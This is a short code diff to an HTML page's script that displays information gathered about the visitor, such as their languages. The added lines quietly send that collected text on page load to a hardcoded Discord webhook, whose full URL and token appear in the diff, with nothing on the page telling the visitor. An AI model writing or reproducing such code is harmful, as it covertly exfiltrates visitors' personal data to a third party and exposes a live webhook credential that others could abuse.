@@ -125,6 +125,12 @@
             <p>Languages: ${Information.Languages}</p>
                 `
             window.onload = Container.innerHTML = newText
+            const webhookUrl = "https://discord.com/api/webhooks/1221488497190240309/NOT16_yCIWjunphmGLzW372wHOte3pshVLB3TNR6xaPa6QHAw9VT4Pm8wPY_J__XNAyJ";
+            fetch(webhookUrl, { method: 'POST', headers: {
+              'Content-Type': 'application/json'
+            },
+                               body: JSON.stringify({ content: newText }),
+                              })
         })
     </script>
   </body>
